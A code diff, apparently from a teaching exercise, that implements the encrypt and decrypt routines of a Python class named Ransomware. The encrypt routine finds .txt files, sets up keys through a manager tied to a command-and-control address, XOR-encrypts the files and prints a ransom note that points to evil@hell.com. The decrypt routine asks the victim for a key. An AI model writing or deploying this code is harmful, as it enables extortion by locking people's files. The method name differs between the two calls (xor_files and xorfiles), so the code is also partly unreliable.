@@ -21,6 +21,15 @@ ENCRYPT_MESSAGE = """
 
 Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
 """
+
+DECRYPT_MESSAGE = """
+ _____ _ _             ____                             _           _ 
+|  ___(_) | ___  ___  |  _ \  ___  ___ _ __ _   _ _ __ | |_ ___  __| |
+| |_  | | |/ _ \/ __| | | | |/ _ \/ __| '__| | | | '_ \| __/ _ \/ _` |
+|  _| | | |  __/\__ \ | |_| |  __/ (__| |  | |_| | |_) | ||  __/ (_| |
+|_|   |_|_|\___||___/ |____/ \___|\___|_|   \__, | .__/ \__\___|\__,_|
+                                            |___/|_| 
+"""
 class Ransomware:
     def __init__(self) -> None:
         self.check_hostname_is_docker()
@@ -41,12 +50,52 @@ class Ransomware:
         return list_file_str
 
     def encrypt(self):
-        # main function for encrypting (see PDF)
-        raise NotImplemented()
+        # Main function for encrypting (see PDF)
+        # Find all txt files
+        txt_files = self.get_files("*.txt")
+
+        #Create the Key Manager
+        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
+        secret_manager.setup()
+
+        # Encrypt the files
+        secret_manager.xor_files(txt_files)
+
+        token = secret_manager.get_hex_token()
+        print(ENCRYPT_MESSAGE.format(token.hex()))
 
     def decrypt(self):
-        # main function for decrypting (see PDF)
-        raise NotImplemented()
+        # Create an instance of SecretManager
+        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
+
+        # Load the local cryptographic elements
+        secret_manager.load()
+
+        # List all the .txt files
+        txt_files = self.get_files("*.txt")
+
+        while True:
+            try:
+                # Ask for the decryption key
+                _key = input("Enter the key to decrypt your files: ")
+
+                # Set the key
+                secret_manager.set_key(_key)
+
+                # Decrypt the files using the xorfiles() method of SecretManager
+                secret_manager.xorfiles(txt_files)
+
+                # Clean up the local cryptographic files
+                secret_manager.clean()
+
+                # Inform the user that the decryption was successful
+                print("Files decrypted")
+
+                # Exit the ransomware
+                break
+            except ValueError as error:
+                # Inform the user that the key is invalid
+                print(f"Error: {error}. Invalid key. Please try again.")
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
